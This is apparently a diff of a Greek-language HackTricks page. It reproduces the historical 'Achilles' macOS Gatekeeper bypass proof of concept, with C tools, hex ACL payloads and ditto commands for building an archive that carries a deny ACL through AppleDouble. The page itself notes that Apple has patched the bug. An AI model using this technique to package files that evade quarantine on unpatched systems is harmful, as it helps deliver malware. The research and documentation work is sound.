@@ -1,63 +1,72 @@
-# επιπλέον στοιχεία xattr-acls στο macOS
+# macOS xattr-acls πρόσθετα
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Το παρακάτω proof of concept αναπαράγει την τεχνική AppleDouble/ACL που χρησιμοποιήθηκε στην έρευνα για το Achilles Gatekeeper bypass: σειριοποιεί ένα ACL ως extended attribute, το διατηρεί σε ένα αρχείο AppleDouble, μετονομάζει το attribute σε `com.apple.acl.text` και αναδημιουργεί το αρχείο ZIP με το `ditto`.<sup>[[1]](#references)[[2]](#references)</sup>
+Αυτό το ιστορικό proof of concept αναπαράγει την τεχνική AppleDouble/ACL που χρησιμοποιήθηκε στην έρευνα για το Achilles Gatekeeper bypass. Σειριοποιεί ένα ACL, το αποθηκεύει σε ένα AppleDouble sidecar, μετονομάζει το attribute σε `com.apple.acl.text` και ξανασυσκευάζει το ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+
+Η Apple διόρθωσε το Gatekeeper bypass στα macOS Ventura 13, Monterey 12.6.2 και Big Sur 11.7.2· η επαναφορά ενός ACL σε έναν σύγχρονο Mac δεν αποδεικνύει ότι λειτουργεί το Gatekeeper bypass.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+
+Για τους ελέγχους quarantine και πρώτης εκκίνησης, δείτε το [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
 chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
-./get_acls test
-ACL for test:
+./get_acls /tmp/test
+ACL for /tmp/test:
 !#acl 1
 group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown
 
 ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a
 ```
+
 <details>
 
 <summary>Κώδικας του get_acls</summary>
+
 ```c
-// gcc -o get_acls get_acls
+// clang -o get_acls get_acls.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/acl.h>
 
 int main(int argc, char *argv[]) {
-if (argc != 2) {
-fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
-return 1;
-}
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
+        return 1;
+    }
 
-const char *filepath = argv[1];
-acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
-if (acl == NULL) {
-perror("acl_get_file");
-return 1;
-}
+    const char *filepath = argv[1];
+    acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
+    if (acl == NULL) {
+        perror("acl_get_file");
+        return 1;
+    }
 
-char *acl_text = acl_to_text(acl, NULL);
-if (acl_text == NULL) {
-perror("acl_to_text");
-acl_free(acl);
-return 1;
-}
+    char *acl_text = acl_to_text(acl, NULL);
+    if (acl_text == NULL) {
+        perror("acl_to_text");
+        acl_free(acl);
+        return 1;
+    }
 
-printf("ACL for %s:\n%s\n", filepath, acl_text);
+    printf("ACL for %s:\n%s\n", filepath, acl_text);
 
-// Convert acl_text to hexadecimal and print it
-printf("ACL in hex: ");
-for (char *c = acl_text; *c != '\0'; c++) {
-printf("\\x%02x", (unsigned char)*c);
-}
-printf("\n");
+    // Convert acl_text to hexadecimal and print it
+    printf("ACL in hex: ");
+    for (char *c = acl_text; *c != '\0'; c++) {
+        printf("\\x%02x", (unsigned char)*c);
+    }
+    printf("\n");
 
-acl_free(acl);
-acl_free(acl_text);
-return 0;
+    acl_free(acl);
+    acl_free(acl_text);
+    return 0;
 }
 ```
+
 </details>
+
 ```bash
 # Add the com.apple.xxx.xxxx extended attribute containing the ACL
 mkdir start
@@ -65,9 +74,11 @@ mkdir start/protected
 ./set_xattr start/protected
 echo something > start/protected/something
 ```
+
 <details>
 
 <summary>Κώδικας του set_xattr</summary>
+
 ```c
 // gcc -o set_xattr set_xattr.c
 #include <stdio.h>
@@ -78,79 +89,81 @@ echo something > start/protected/something
 
 
 void print_xattrs(const char *filepath) {
-ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
-if (buflen < 0) {
-perror("listxattr");
-return;
-}
+    ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
+    if (buflen < 0) {
+        perror("listxattr");
+        return;
+    }
 
-char *buf = malloc(buflen);
-if (buf == NULL) {
-perror("malloc");
-return;
-}
+    char *buf = malloc(buflen);
+    if (buf == NULL) {
+        perror("malloc");
+        return;
+    }
 
-buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
-if (buflen < 0) {
-perror("listxattr");
-free(buf);
-return;
-}
+    buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
+    if (buflen < 0) {
+        perror("listxattr");
+        free(buf);
+        return;
+    }
 
-printf("All current extended attributes for %s:\n", filepath);
-for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
-printf("%s: ", name);
-ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
-if (valuelen < 0) {
-perror("getxattr");
-continue;
-}
+    printf("All current extended attributes for %s:\n", filepath);
+    for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
+        printf("%s: ", name);
+        ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
+        if (valuelen < 0) {
+            perror("getxattr");
+            continue;
+        }
 
-char *value = malloc(valuelen + 1);
-if (value == NULL) {
-perror("malloc");
-continue;
-}
+        char *value = malloc(valuelen + 1);
+        if (value == NULL) {
+            perror("malloc");
+            continue;
+        }
 
-valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
-if (valuelen < 0) {
-perror("getxattr");
-free(value);
-continue;
-}
+        valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
+        if (valuelen < 0) {
+            perror("getxattr");
+            free(value);
+            continue;
+        }
 
-value[valuelen] = '\0';  // Null-terminate the value
-printf("%s\n", value);
-free(value);
-}
+        value[valuelen] = '\0';  // Null-terminate the value
+        printf("%s\n", value);
+        free(value);
+    }
 
-free(buf);
+    free(buf);
 }
 
 
 int main(int argc, char *argv[]) {
-if (argc != 2) {
-fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
-return 1;
-}
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
+        return 1;
+    }
 
-const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
-const char *filepath = argv[1];
+    const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
+    const char *filepath = argv[1];
 
-int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
-if (result == 0) {
-printf("Extended attribute set successfully.\n\n");
-} else {
-perror("setxattr");
-return 1;
-}
+    int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
+    if (result == 0) {
+        printf("Extended attribute set successfully.\n\n");
+    } else {
+        perror("setxattr");
+        return 1;
+    }
 
-print_xattrs(filepath);
+    print_xattrs(filepath);
 
-return 0;
+    return 0;
 }
 ```
+
 </details>
+
 ```bash
 # Create an AppleDouble file containing the extended attribute
 ditto -c -k start protected.zip
@@ -167,12 +180,20 @@ rm ._*
 ```
 
 ```bash
-# Check if it worked
+# Check whether the AppleDouble ACL was restored; an ACL is not itself a normal xattr
 ditto -x -k --rsrc protected.zip .
-xattr -l protected
+ls -lde protected
+# A local ditto extraction alone does not test browser/Archive Utility quarantine propagation
+xattr -p com.apple.quarantine protected
 ```
+
+
+
 ## References
 
-- [1] [Microsoft Security Blog — Achillesheel des Gatekeepers: Eine macOS-Schwachstelle aufgedeckt](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [2] [Apple Developer — Verpacken von Mac-Software für die Distribution mit `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
+- [1] [Microsoft Security Blog — Η αχίλλειος πτέρνα του Gatekeeper: Ανακαλύπτοντας μια ευπάθεια στο macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — Συσκευασία λογισμικού Mac για διανομή με `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
+- [3] [Apple Support — Πληροφορίες για το περιεχόμενο ασφάλειας του macOS Ventura 13](https://support.apple.com/en-ae/102853)
+- [4] [Apple Support — Πληροφορίες για το περιεχόμενο ασφάλειας του macOS Monterey 12.6.2](https://support.apple.com/en-ae/102806)
+- [5] [Apple Support — Πληροφορίες για το περιεχόμενο ασφάλειας του macOS Big Sur 11.7.2](https://support.apple.com/en-us/102785)
 {{#include ../../../../banners/hacktricks-training.md}}
